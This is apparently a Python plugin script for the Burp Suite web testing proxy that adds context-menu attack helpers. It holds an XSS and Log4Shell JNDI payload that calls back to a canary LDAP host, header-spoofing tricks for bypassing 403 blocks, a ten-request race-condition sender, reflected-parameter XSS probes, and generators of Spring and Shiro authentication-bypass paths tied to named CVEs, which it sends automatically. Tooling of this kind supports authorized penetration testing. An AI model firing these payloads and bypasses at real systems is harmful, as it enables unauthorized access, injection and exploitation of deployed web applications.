import json


pool = RequestPool(20)


@run_in_thread
def send_with_proxy(request):
    sendWithProxy(request, "127.0.0.1", 8080)


def insert_at_cursor():
    return "'\"><img/src/onerror=alert(1)>${jndi:ldap://inseratcursor." + canary + "/a}"


def json_dumps(selectedText):
    return json.dumps(json.loads(selectedText), ensure_ascii=True, indent=2)


def bypass403(messageEditor):
    request = messageEditor.requestResponse().request()
    xheaders = ["X-Forwarded-For", "X-Originating-IP", "X-Remote-Addr", "X-Remote-IP", "X-Remote-Addr", "X-Real-IP", "X-Forwarded-Host", "X-Client-IP", "X-Host"]
    for header in xheaders:
        request = request.withHeader(header, "127.0.0.1")
    messageEditor.setRequest(request)


def removeBoringHeaders(editor):
    request = editor.requestResponse().request()
    boring_headers = ["Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform", "Sec-Fetch-Site", "Sec-Fetch-Mode", "Sec-Fetch-Dest", "Priority"]
    for header in boring_headers:
        request = request.withRemovedHeader(header)
    editor.setRequest(request)

# When performing network I/O or other time-consuming operations, the main thread's user interface (UI) gets blocked
# until these operations are completed. By delegating time-consuming network I/O operations to threads(@run_in_thread),
# the main thread can continue executing other tasks without being blocked.
@run_in_thread
def race_condition_10(request):
    print("race condition requests:", request.url())
    sendRequests([request] * 10)


def insert_to_reflect_params(messageEditor):
    payload = "REFLECT_PARAMS_<img/src=x>"
    request = messageEditor.requestResponse().request()
    response = messageEditor.requestResponse().response()
    if response is None:
        print("response not found")
        return
    body = response.bodyToString()
    for param in request.parameters():
        if (param.type() == HttpParameterType.BODY or param.type() == HttpParameterType.URL) and (param.value() in body or urldecode(param.value()) in body):
            request = request.withRemovedParameters(param).withParameter(parameter(param.name(), payload, param.type()))
    messageEditor.setRequest(request)


def middle_bypass_poc(path1 ,path2):
    middles = ["/;/",  # https://evilpan.com/2023/08/19/url-gotchas-spring/#bypass-tricks
               "\\",
               "/foo/..;/",
               "//",
               "/foo/.././/",
               "/%20/%20//%20",
               "%20/", # spring CVE-2016-5007
               "/%0d", # spring CVE-2016-5007
               ]
    return_pocs = []
    for middle in middles:
        return_pocs.append(path1 + middle + path2)

    # special https://evilpan.com/2023/08/19/url-gotchas-spring/#bypass-tricks
    return_pocs.append(path1 + '/' + '%%%02x' % ord(path2.lstrip('/')[:1]) + path2[1:])
    return_pocs.append(path1 + '/' + path2.lstrip('/')[:1].upper() + path2[1:])
    return_pocs.append(path1 + '/' + path2.lstrip('/')[:1].lower() + path2[1:])
    return_pocs.append(path1 + '/' + path2.lstrip('/')[:1] + '%0d' + path2[1:]) # shiro cve-2022-32532
    return return_pocs


def suffix_bypass_poc(path):
    only_suffix_poc = []
    suffixs = ['/', # shiro cve-2021-41303
               "/.", # shiro CVE-2020-17510
               "/%2e", # shiro CVE-2020-17510
               "/%20", # shiro CVE-2020-17523
               "%0d%0a", # shiro CVE-2022-22978
               '?',
               ';a=b',
               ';.css',
               '\x09', # https://mp.weixin.qq.com/s/DKVygLtFCmkCs1wycuH70w
               ';',
               #                '\x85',
               #                '\xA0',
               #                '\x0C',
               ]
    for suffix in suffixs:
        only_suffix_poc.append(path.rstrip("/") + suffix)
    return only_suffix_poc


def process_path_list(path, nest_level):
    parts = path.strip('/').split('/')
    if len(parts) < 2:
        print("spring bypass: path nest level need great than {}".format(nest_level))
        return []
    pocs = suffix_bypass_poc(path)

    path1, path2 = '', path.lstrip('/')
    pocs.extend(middle_bypass_poc(path1, path2))
    for i in range(nest_level-1):
        if i+1 > len(parts):
            break
        path1, path2 = '/' + '/'.join(parts[:i+1]), '/'.join(parts[i+1:])
        pocs.extend(middle_bypass_poc(path1, path2))
    return pocs


@run_in_thread
def router_bypass(request, response):
    print("send spring bypass requests:", request.url())
    origin_status_code = response.statusCode()
    origin_content_length = len(response.bodyToString())

    nest_level = 2
    for poc_path in process_path_list(request.path(), nest_level):
        requestResponse = sendRequest(request.withPath(poc_path))
        if requestResponse.response() is None:
            continue
        response = requestResponse.response()
        new_status_code = response.statusCode()
        new_content_length = len(response.bodyToString())
        if new_status_code not in [400, 404, 0] and ((origin_status_code != new_status_code and new_status_code == 200) or origin_content_length != new_content_length):
            #            print(requestResponse.request().url())
            addIssue(auditIssue("spring authentication bypass", "String detail", "String remediation",request.url(),
                                AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN, "String background",
                                "String remediationBackground", AuditIssueSeverity.MEDIUM, requestResponse))


def registerContextMenu(menus):
    """
    To register a custom context menu using the register method,
    three parameters need to be passed: the menu name, the menu function, and the menu type.
    The menu types include CARET, SELECTED_TEXT, REQUEST, REQUEST_RESPONSE and MESSAGE_EDITOR.
    """
    menus.register("Bypass 403", bypass403, MenuType.MESSAGE_EDITOR)
    menus.register("Find Reflect Params", insert_to_reflect_params, MenuType.MESSAGE_EDITOR)
    menus.register("Purify Headers", removeBoringHeaders, MenuType.MESSAGE_EDITOR)

    menus.register("JSON Format", json_dumps, MenuType.SELECTED_TEXT)
    menus.register("JSON Quotes", lambda s: json.dumps(s, ensure_ascii=False), MenuType.SELECTED_TEXT)
    menus.register("Unicode Escape", lambda s: s.decode().decode('unicode_escape'), MenuType.SELECTED_TEXT)

    menus.register("Send With Proxy", send_with_proxy, MenuType.REQUEST)
    menus.register("Race Condition x10", race_condition_10, MenuType.REQUEST)

    menus.register("XSS At Cursor", insert_at_cursor, MenuType.CARET)

    menus.register("Spring Bypass", router_bypass, MenuType.REQUEST_RESPONSE)


def finish():
    pool.shutdown()

